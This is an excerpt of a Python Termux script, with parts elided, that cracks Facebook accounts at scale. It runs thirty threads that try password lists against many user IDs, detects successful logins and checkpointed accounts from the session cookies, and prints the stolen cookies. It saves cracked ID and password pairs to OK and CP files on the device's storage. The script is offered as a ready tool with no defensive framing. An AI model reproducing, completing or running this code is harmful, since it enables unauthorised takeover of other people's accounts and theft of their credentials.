# NAME : SK SUYAIF HASSAN
# GITHUB : https://github.com/ontor-404
# FB GROUP : SK~SUYAIF_TERMUX ALL FREE COMMAND
...
def Main():
        ...
        if Alhaj in ["1","01"]:
            sexy()
        if Alhaj in ["2","02"]:
        	os.system('xdg-open https://wa.me/+8801320546046')
        if Alhaj in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        tl = str(len(user))
        print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print('\033[1;33m[💐\033[1;33m] \033[1;33mYOUR TOTAL IDS : \033[1;32m'+tl)
    ...
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [😻] OK 𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt')
    print(' [👿] CP 𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅]\033[1;36m🤔[%s/%s]💐\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32m𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅-OK 🌺\033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92m[💞] COOKIE :\033[1;95m {coki}")
                open('/sdcard/𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32m𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅-CP\033[1;33m]\033[1;91m {uid}|{ps}")
                open('/sdcard/𝐒𝐊~𝐒𝐔𝐘𝐀𝐈𝐅-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
